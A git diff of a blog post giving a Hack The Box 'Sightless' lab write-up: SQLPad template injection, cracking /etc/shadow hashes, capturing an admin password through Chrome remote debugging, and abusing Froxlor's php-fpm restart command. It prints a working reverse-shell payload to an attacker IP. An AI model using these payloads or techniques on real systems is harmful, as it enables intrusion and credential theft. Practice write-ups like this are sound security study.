@@ -4,11 +4,9 @@ title: Sightless Writeup HTB
 description: coming.
 pubDate: 2024-09-08T21:44:00Z
 // imgSrc: '/assets/images/image-post5.jpeg'
-imgSrc: '/assets/images/sightless.jpg'
+imgSrc: '/assets/images/sightless.png'
 imgAlt: 'Image post 5'
 ---
-
-
 
 
 # Sightless Writeup
@@ -25,19 +23,20 @@ I visited the IP address in my browser and was redirected to `sightless.htb`. I 
 ```bash
 rustscan -a 10.10.11.32 -- -sC -sV -oN nmap
 ```
+
 I also initiated a directory search using Dirsearch:
+
 ```bash
 dirsearch -u http://sightless.htb/
 ```
+
 Next, I opened Burp Suite and started proxying the traffic through it.
 
 Back on the site, I browsed through the content looking for interesting information. I came across a button labeled "SQLPad" that led to a subdomain: `sqlpad.sightless.htb`. I added this subdomain to my host files for further investigation.
 
-
 ![2024-09-08_09-04](https://github.com/user-attachments/assets/924427a2-bb38-4f0e-a53c-1f40bec07277)
 
- 
- During this time my initia scan finished 
+ During this time my initia scan finished
 nmap result
   
 ```bash  
@@ -97,10 +96,13 @@ SF:x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20be
 SF:ing\x20more\x20creative\r\n");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
 port 21 is open which is for ftp, i tried anonymous login which didnt work, i'll come back to this later
 
 ### dirsearch result
+
 Dirsearch revealed a directory:
+
   ```bash
 dirsearch -u http://sightless.htb/
 
@@ -120,6 +122,7 @@ Target: http://sightless.htb/
                                                                              
 Task Completed  
 ```
+
 The /images directory returned a "403 Forbidden" response.
 
 ## SQLPad Exploitation
@@ -134,7 +137,6 @@ I spent some time trying to understand and exploit this vulnerability. After som
 
 ![2024-09-08_11-33](https://github.com/user-attachments/assets/73590400-7a76-45f5-8d1e-68f13a7faec2)
 
-
 1. **Create a New Connection:**
    - **Name:** `test`
    - **Driver:** `mysql`
@@ -142,9 +144,11 @@ I spent some time trying to understand and exploit this vulnerability. After som
 
 2. **Payload:**
    - Use the following payload in the database name field:
+
      ```plaintext
      {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.19/4444 0>&1"') }}
      ```
+
    - Replace `10.10.14.19` with your own IP address.
 
 3. **Setup Listener:**
@@ -154,8 +158,6 @@ I spent some time trying to understand and exploit this vulnerability. After som
    - Click on the "Test" button to trigger the payload.
 
 After setting up the listener and testing the connection, I received a reverse shell on my listener.
-
-
 
 ## Initial Discovery
 
@@ -172,8 +174,8 @@ Copied the root and `micheal` user hashes from `/etc/shadow`. Used `hashcat` to 
 ```bash
 hashcat -m 1800 hash ~/tools/rockyou.txt
 ```
-A few minutes later, both passwords were cracked. 
 
+A few minutes later, both passwords were cracked.
 
 ![2024-09-08_12-03](https://github.com/user-attachments/assets/fe499622-4578-4e18-b5a9-1e87128a3acd)
 
@@ -190,6 +192,7 @@ root:x:0:0:root:/root:/bin/bash
 michael:x:1000:1000:michael:/home/michael:/bin/bash
 john:x:1001:1001:,,,:/home/john:/bin/bash
 ```
+
 After checking usual folders without much success,i ran linpeas. It revealed some new subdomains: admin.sightless.htb and web1.sightless.htb. Accessing both of these subdomains redirected back to sightless.htb.
 
 Active Ports
@@ -212,7 +215,9 @@ tcp        0      0 127.0.0.1:34673         0.0.0.0:*               LISTEN      
 tcp6       0      0 :::22                   :::*                    LISTEN      -                   
 tcp6       0      0 :::21                   :::*                    LISTEN      -                   
 ```
-this looks promising, i started to 8080 since it's usually a web service port, i tested it with curl and got some data back 
+
+this looks promising, i started to 8080 since it's usually a web service port, i tested it with curl and got some data back
+
 ```bash
 curl http://127.0.0.1:8080
 <!DOCTYPE html>
@@ -230,10 +235,13 @@ curl http://127.0.0.1:8080
         <script src="templates/Froxlor/build/assets/app-67d6acee.js" type="module"></script>
 snip---
 ```
+
 so i set up port forwarding to view the webpage in a browser
+
 ```bash
 ssh -L 8080:127.0.0.1:8080 micheal@10.10.11.32
 ```
+
 Accessed 127.0.0.1:8080 and saw a Froxlor webpage, it was a login form
 ![foxfor](https://github.com/user-attachments/assets/4ce2d526-67d6-46ba-b04b-1aa5a7d228a1)
 
@@ -248,6 +256,7 @@ I searched online for Froxlor vulnerabilities, but the available RCE exploits we
 ### Revisiting Linpeas Output
 
 Going back to the `linpeas` scan, I re-examined the results and noticed a command run by the user `john`:
+
 ```bash
 /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.vjEYUV data:,
 ```
@@ -261,7 +270,6 @@ Researching Chrome Remote Debugging led me to a [relevant exploitation guide](ht
 I then launched Google Chrome to test this further:
 
 1. **Port Forwarding**: Made sure to forward the necessary internal ports:
-
 
 2. **Accessing Remote Debugging**: Opened Chrome and navigated to `chrome://inspect/#devices`.
 
@@ -286,17 +294,16 @@ ssh -L 8080:127.0.0.1:8080 \
     -L 33060:127.0.0.1:33060 \
     michael@10.10.11.32
 ```
+
 I used this method because the debugging port changes periodically. When forwarding these ports, it’s crucial to add them to your Chrome target discovery hosts quickly as it switches to a new port.
 
 you dont have to portforward everything to a new port, you can map all the chnaging ports to 8080, so you just have to inspect one port in your chrome debugger
 
+[vid](https://github.com/user-attachments/assets/636c5bc4-afc2-4313-a622-6b8552239b8a)
+
 Monitoring Traffic
 After port forwarding, I began monitoring the traffic on the debug port. On my second attempt, I observed that the admin was typing their password
 from inspect elements i was able to read the creds this ia a fun one
-
-
-
-
 
 ### Logging In on froxlor
 
@@ -305,16 +312,15 @@ Using the captured credentials, I logged in and accessed the dashboard.
 Now that we have valid credentials, I can proceed to try the authenticated exploits we reviewed earlier.
 none of them worked
 
-
 ## Troubleshooting and Final Solution
 
 After spending a few hours trying different methods, I concluded that the box might be broken. However, I eventually figured out a workaround.
 
 ### PHP-FPM Restart Command
 
-Under the **PHP** settings, specifically in the **PHP-FPM Versions** section, there was a field labeled **php-fpm restart command**. This command is executed whenever the PHP-FPM service is restarted. 
+Under the **PHP** settings, specifically in the **PHP-FPM Versions** section, there was a field labeled **php-fpm restart command**. This command is executed whenever the PHP-FPM service is restarted.
 
-The issue was that this field did not accept all payloads, and even the commands it did accept did not execute as expected. 
+The issue was that this field did not accept all payloads, and even the commands it did accept did not execute as expected.
 
 ### Workaround
 
@@ -340,17 +346,6 @@ turn it off save it
 then wait for a few minutes for the service to stop completely, then turn it back on, then wait a few more minutes till you can see that the root flag has been copied to the location you chose, afte that you wont be able to read the file, you have to chnage it's permission, you have to repeat the whole steps so instead of copy command
 you use chmod 777 /home/bbbb or whatever you saved it as, wait a few minutes and you should be able to read the flag
 
-
 ![rootflag](https://github.com/user-attachments/assets/151c5ba6-3e76-41b1-86cc-9d994fcac815)
 
-
-
-This approach allowed me to retrieve the root flag despite the limitations with the PHP-FPM restart command.
-
-
-
-
-
-
-
-
+This approach allowed me to retrieve the root flag despite the limitations with the PHP-FPM restart command
